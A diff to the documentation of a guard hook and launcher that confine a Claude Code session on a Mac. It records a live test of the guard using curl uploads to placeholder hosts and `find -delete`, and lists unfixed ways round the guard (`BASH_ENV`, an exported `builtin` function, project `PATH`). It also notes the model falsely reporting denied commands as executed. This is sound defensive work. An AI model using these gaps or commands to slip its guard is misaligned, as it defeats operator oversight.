@@ -59,13 +59,18 @@ scripts/stop.sh                       # stop the server recorded in logs/llama-s
   on stderr. Why: the guard hook reads each command as bash syntax, and Claude Code
   otherwise takes the tool's shell from `$SHELL`, which is zsh on this Mac; zsh has syntax
   the guard does not model (`=( )`, `=name`, glob qualifiers that run code). An inherited
-  `CLAUDE_CODE_SHELL_PREFIX` or `CLAUDE_ENV_FILE` is removed, and a project
-  `.claude/settings*.json` whose `env` names `CLAUDE_CODE_SHELL`, `SHELL`,
-  `CLAUDE_CODE_SHELL_PREFIX` or `CLAUDE_ENV_FILE` refuses the launch. What you lose: the
+  `CLAUDE_CODE_SHELL_PREFIX`, `CLAUDE_ENV_FILE` or exported function is removed, and a
+  project `.claude/settings*.json` whose `env` names `CLAUDE_CODE_SHELL`, `SHELL`,
+  `CLAUDE_CODE_SHELL_PREFIX`, `CLAUDE_ENV_FILE` or a bash start-up variable refuses the
+  launch (list and open items under Known limits). What you lose: the
   aliases, functions and options of `~/.zshrc` are no longer applied to tool commands;
-  per Claude Code's documentation `~/.bashrc` is sourced instead if present. UNVERIFIED
-  live: no session has run since this change; the first one must show `$BASH_VERSION`
-  (expected `3.2.57(1)-release`) from a Bash tool call.
+  per Claude Code's documentation `~/.bashrc` is sourced instead if present (UNVERIFIED).
+  Seen live on client 2.1.325 in print mode (2026-11-15, `s6` and `s7` in
+  `bench/results/20261115-live-guard-check/`): `echo =ls` returned `=ls` (zsh would print
+  a path) and `shopt -p extglob` returned `shopt -u extglob` (zsh has no `shopt`; exit 1
+  is bash's status for an unset option), so the Bash tool ran bash. The version string
+  was not observed; 3.2 follows from the pinned path. Probe with commands like these that
+  hold no `$`: the client refuses a variable expansion in print mode (Known limits).
 - Before a serve or a bench, check the machine: swap in use (`sysctl vm.swapusage`),
   memory free (`serve.sh` logs `memory free: <N> MiB available` at every start), Low
   Power Mode off (`pmset -g`), other large apps closed.
@@ -169,7 +174,7 @@ Run from the repo root:
 ```bash
 /opt/homebrew/bin/python3.13 scripts/tests/serve_test.py         # about 2 minutes; ends "OK" (78 tests)
 /opt/homebrew/bin/python3.13 scripts/tests/stop_test.py          # ends "OK" (20 tests)
-/opt/homebrew/bin/python3.13 scripts/tests/claude_local_test.py  # ends "997/997 passed"
+/opt/homebrew/bin/python3.13 scripts/tests/claude_local_test.py  # ends "1448/1448 passed"
 ```
 
 The hook suites (`scripts/hooks/tests/*_test.py`) and the template check are listed in
@@ -194,22 +199,107 @@ The hook suites (`scripts/hooks/tests/*_test.py`) and the template check are lis
 - Thinking runaways are not capped: `--reasoning-budget` is not on `serve.sh`'s
   allow-list.
 - Print mode (`-p`) cannot answer a permission prompt: a command that needs approval
-  comes back "This command requires approval". Pre-approve the test command or run the
-  session interactively (pre-approval not yet tried, UNVERIFIED). The guard also refuses inline `python3 -c` and running a file
-  written in the same session.
+  comes back "This command requires approval". Pre-approve the test command with
+  `--allowedTools` (tried live, below: the glob grant `Bash(curl *)` let a curl run that
+  no rule or hook decides, and `Bash(shopt -p extglob)`, an exact grant, ran a command
+  that no rule matches and the hook does not decide) or run the session interactively.
+  The guard also refuses inline `python3 -c` and running a file written in the same
+  session.
+- Live guard check, 2026-11-15: client 2.1.325, the default model, default permission
+  mode, thirteen print sessions capped at `--max-turns 3` (`--output-format stream-json
+  --verbose`), logs, prompts and grants in `bench/results/20261115-live-guard-check/`
+  (gitignored). `s8`-`s10` record their full argument list in `.args`; for the earlier
+  sessions `NOTES.txt` lists the grants as reported, since their logs do not record
+  them. Hook decisions and matching settings rows per command were computed offline
+  (`step0.out`, `hook-decisions-s1-s7.out`). Seen there, for these exact commands only:
+  - the Bash tool ran bash (Quick start; `s6`, `s7`; `s7` under `--allowedTools
+    'Bash(shopt -p extglob)'`, a command no settings row matches and the hook does not
+    decide, `step0.out`);
+  - W-19: `curl -d x https://example.invalid/x` was denied by the hook with "lis-guard:
+    network upload to a non-loopback host matched; critical write; not retryable; report
+    it to the operator instead." (`s2b`);
+  - W-25: `find . -name keep.txt -delete` was denied by the hook with "lis-guard: find
+    -delete matched; critical write; not retryable; report it to the operator instead."
+    (`s3`, which holds the deny only); `keep.txt` was still in the work directory when
+    that directory was listed after the sessions (not in a saved log);
+  - a grant and an ask row: `curl https://example.invalid/x`, which no settings row
+    matches and the hook does not decide (`step0.out`), ran under `--allowedTools
+    'Bash(curl *)'` (`curl: (6) Could not resolve host: example.invalid`, `s8`) and was
+    refused without it ("This command requires approval", `decision_reason_type`
+    "other", `s9`), so the grant is what let it run. Under the same grant
+    `curl -d x http://127.0.0.1:9/x`, which the hook does not decide and only the ask row
+    `Bash(curl -d*)` matches (`step0.out`), was refused with "Claude requested
+    permissions to use Bash, but you haven't granted it yet." (`decision_reason_type`
+    "rule"): first seen in `s4b`, repeated with recorded arguments in `s10`. Limits: the
+    client does not name the rule that fired; the row matching is this repo's model of
+    the client's glob matching, not the client's own; `s8` and `s10` differ in the host
+    as well as in the upload flag; one run each. `s5b` (`curl http://127.0.0.1:9/x`
+    under the same grant, ran, curl exit 7) is no evidence about the grant: the hook
+    allows that command (`hook-decisions-s1-s7.out`);
+  - in print mode the client refused `echo "BV=$BASH_VERSION ZV=$ZSH_VERSION S=$SHELL"`
+    itself with "A variable in this command can't be checked before it runs" (`s1`; one
+    command observed; not a hook message, and the hook gives that command no decision);
+  - three first prompts got a text reply and no tool call (`s2`, `s4`, `s5`), and the
+    model's closing text called a hook deny, a client refusal and a failed curl
+    "executed" or "successfully executed" (`s2b`, `s4b`, `s5b`; also `s8`, a curl that
+    exited 6, and `s10`, a refusal called "running"). Judge a session by its tool
+    results, not by the model's closing text.
+
+  Re-check after a client upgrade. Not exercised live, still UNVERIFIED:
+  `--permission-mode` variants, interactive prompting, user-scope precedence, `~/.bashrc`
+  sourcing, and whether a settings `env` block reaches the Bash tool.
 - UNVERIFIED on this client: that the `--settings` file outranks the project's
   `.claude/settings*.json` (the launcher refuses risky project files instead);
   `--permission-mode manual`; compaction with reasoning on.
 - The session shell pin (Quick start) rests on Claude Code's documentation, read
-  2026-11-14 and UNVERIFIED on 2.1.325: `CLAUDE_CODE_SHELL` picks the Bash tool's shell, a
-  value that is not a working bash or zsh is ignored in favour of auto-detection (`$SHELL`
-  first, hence `SHELL=/bin/bash` too), and no minimum bash version is documented, so bash
-  3.2 is untried. Under `--user-scope` and `--full` the user settings load as well and the
-  launcher never reads them: a user `env` entry for `SHELL` or `CLAUDE_CODE_SHELL` is
-  documented to lose to the `--settings` file's pin (UNVERIFIED), while a user `env` entry
-  for `CLAUDE_CODE_SHELL_PREFIX` or `CLAUDE_ENV_FILE` applies and nothing here overrides it.
+  2026-11-14: `CLAUDE_CODE_SHELL` picks the Bash tool's shell, a value that is not a
+  working bash or zsh is ignored in favour of auto-detection (`$SHELL` first, hence
+  `SHELL=/bin/bash` too), and no minimum bash version is documented. On 2.1.325 the Bash
+  tool ran bash for the two probe commands of the live check (above); nothing more of
+  bash 3.2 under the client has been tried. With bash as the tool shell, bash's own start-up matters: `BASH_ENV`
+  names a script bash runs before the command, and an exported function
+  (`BASH_FUNC_ls%%=() {...}`) runs in place of the command it names (both seen with
+  harmless stand-ins on this Mac's bash 3.2). If the client applies a settings `env` block
+  to the Bash tool (documented, UNVERIFIED), a command the guard allows would also run
+  code the guard never sees. So:
+  - a project `.claude/settings*.json` whose `env` names `BASH_ENV`, `ENV`, `HOME` (it
+    re-points `~/.bash_profile` and `~/.bashrc`), `POSIXLY_CORRECT`, `INPUTRC`,
+    `SHELLOPTS`, `BASHOPTS`, `PS1`, `PS2`, `PS4`, `PROMPT_COMMAND` or any `BASH_FUNC_` name
+    (any letter case, surrounding whitespace ignored) refuses the launch, as the shell
+    names above do;
+  - from the caller's environment the launcher removes the functions bash 3.2 imported
+    from it, right after `set +xv`, including names that are no identifier (`-x`, `--`,
+    `-`, `a-b`, `a.b`, imported outside posix mode), so they reach neither serve.sh nor
+    claude, and refuses to start if one is still listed. It also removes `PS1`, `PS2`,
+    `PS4`, `PROMPT_COMMAND`, `POSIXLY_CORRECT` and `INPUTRC`, besides `BASH_ENV`, `ENV`,
+    `SHELLOPTS` and `BASHOPTS` (removed before). A `BASH_FUNC_` entry that is no function
+    definition is not imported by bash 3.2 and passes through unchanged, inert there.
+  - Limit: the launcher does not defend itself against the shell that starts it. Seen
+    with echo-only stand-ins on bash 3.2: a caller `BASH_ENV` is sourced by the launcher's
+    bash before its first line; a caller function named `builtin` replaces every
+    `builtin X` in the removal, so it defeats the removal and the check and reaches
+    claude; a caller function named `set` runs once, in place of the first line, outside
+    posix mode, and is then removed. A test exports one echo-only function per run for
+    each of bash 3.2's 58 builtins plus `ls`, `die` and `say` (no posix mode): every run
+    ends, the functions that ran are exactly `builtin` and `set`, and every name but
+    `builtin` launches with no `BASH_FUNC_` name reaching claude.
+
+  Still open (operator decisions):
+  - `env.PATH` in a project file is not refused, and the launcher neither clears nor
+    sets `PATH`: claude is found on the caller's `PATH` and the session inherits it, so a
+    project `PATH` entry would decide which program a bare command name runs.
+  - `CDPATH` (where `cd name` lands), `GLOBIGNORE` (which files a glob leaves out),
+    `HISTFILE` (the file an interactive bash writes its history to at exit) and `TMPDIR`
+    are neither refused nor removed; none runs code, each can change what an allowed
+    command touches.
+  - Under `--user-scope` and `--full` the user settings load as well and the launcher
+    never reads them: a user `env` entry for `SHELL` or `CLAUDE_CODE_SHELL` is documented
+    to lose to the `--settings` file's pin (UNVERIFIED), while a user `env` entry for
+    `CLAUDE_CODE_SHELL_PREFIX`, `CLAUDE_ENV_FILE` or any bash start-up name above applies
+    and nothing here overrides it.
 - The guard carries the reference's W-25 (ported 2026-11-14, checked by
-  `lis-guard_test.py`; not yet exercised in a live session, UNVERIFIED there):
+  `lis-guard_test.py`; exercised live once, `find . -name keep.txt -delete` denied by the
+  hook, live guard check above; every other form UNVERIFIED in a live session):
   `find <path> ... -delete`, `find ... -exec|-execdir|-ok|-okdir rm {} ;|+`, `git restore`
   and `git checkout [<ref>] -- <paths>` are refused as deletes, BSD find's leading options
   included (`find -E`, `-x`, `-L`, `-f path`). The text scan has bounds: an `rm`
@@ -279,12 +369,20 @@ The hook suites (`scripts/hooks/tests/*_test.py`) and the template check are lis
   removed denies of those had no ask counterpart). The existing `curl * -d*`, `*--data*`,
   `*--json*`, `* -T*`, `*--upload-file*`, `* -X*` and `*@*` ask rows stay.
   Documented by Claude Code (permissions, permission-modes and hooks pages, read
-  2026-11-14), UNVERIFIED on the installed client 2.1.325:
+  2026-11-14), UNVERIFIED on the installed client 2.1.325 except the two live results
+  named here (live guard check above: these commands, print mode, default permission
+  mode; re-check after a client upgrade):
   - Rules are checked deny, then ask, then allow, in every permission mode. A matching ask
     rule prompts even when an allow rule also matches, and `--allowedTools` cannot
-    override an ask or deny rule.
+    override an ask or deny rule. Live, consistent with this for an ask row:
+    `--allowedTools 'Bash(curl *)'` let an otherwise undecided curl run (`s8` against
+    `s9`), while under it `curl -d x http://127.0.0.1:9/x`, matched only by the ask row
+    `Bash(curl -d*)` in this repo's model, was refused with a rule-type reason (`s4b`,
+    `s10`); the client does not name the rule, and the limits in the live check apply.
   - A PreToolUse hook's allow does not skip a matching ask rule or override a deny rule. A
     hook deny blocks whatever the allow rules say; no hook decision leaves the normal flow.
+    Live: the hook denied `curl -d x https://example.invalid/x` with no grant given
+    (`s2b`); a hook deny against an allow rule was not tried.
   - A compound command is split at `&&`, `||`, `;`, `|`, `|&`, `&` and newlines, and runs
     unprompted only when every part is allowed. A deny or ask rule applies when any part
     matches, including a command in a subshell or in `$(...)`. Backticks and process
@@ -293,7 +391,7 @@ The hook suites (`scripts/hooks/tests/*_test.py`) and the template check are lis
     `xargs` are stripped before matching, and deny and ask rules match past leading
     `VAR=value` words. `env` is not in that list, and `bash -c '...'`/`sh -c '...'` are
     not looked into.
-  - In print mode a call that needs approval is refused.
+  - In print mode a call that needs approval is refused (live: `s4b`, `s9`, `s10`, above).
   So the guard hook refuses an upload to a non-loopback host, with two exceptions:
   - under `--no-guard`, where the ask rows or the mode default decide;
   - behind the wrappers the hook does not read through (listed above).
@@ -318,8 +416,9 @@ The hook suites (`scripts/hooks/tests/*_test.py`) and the template check are lis
   are now pinned to `/bin/bash` (Quick start), where `=( )` is no process substitution:
   `/bin/bash -n` on `cat =(ls)` reports `syntax error near unexpected token` at the `(` (checked
   on this machine, 2026-11-15), so such a line should fail to run rather than run its
-  body. That the client honours the pin on 2.1.325 is UNVERIFIED until a live session
-  shows `$BASH_VERSION`; until then a zsh session would still run these bodies. The text is read raw: a quoted
+  body. The live check showed the Bash tool running bash on 2.1.325 (Quick start); a
+  `=( )` line itself was not tried live, and a session whose tool shell is zsh would
+  still run these bodies. The text is read raw: a quoted
   `"<(curl -d x https://example.com)"` or `'>(...)'`, which the shell does not substitute,
   is denied too (an accepted false positive); `< (`, a syntax error in bash, is not read.
   A body with no `curl` or `wget` in it (quotes and backslashes dropped) is not walked.
@@ -352,8 +451,9 @@ The hook suites (`scripts/hooks/tests/*_test.py`) and the template check are lis
   concerned are `echo *`, `ls*`, `cat *`, `grep *`, `which *`, `git status*`, `date +*`,
   `head *`, `tail *`, `wc *` and `tr *`. This is documented not to happen for `$(...)`
   and compound commands, and undocumented for backticks and `<( )`. Every outcome here
-  comes from the tests' rule-matching model and a string corpus; none has been observed
-  in a live session (UNVERIFIED).
+  comes from the tests' rule-matching model and a string corpus; of them only the
+  `curl -d` ask row against a `Bash(curl *)` grant was observed live (above), the rest is
+  UNVERIFIED in a live session.
 - The guard reads a script or patch file only when it is a regular file. A FIFO, a
   device (`/dev/stdin`, `/dev/tty`), a socket or a directory is never read, so the hook
   cannot block on one: before 2026-11-14 it could (and `lis-guard_test.py` hung when run
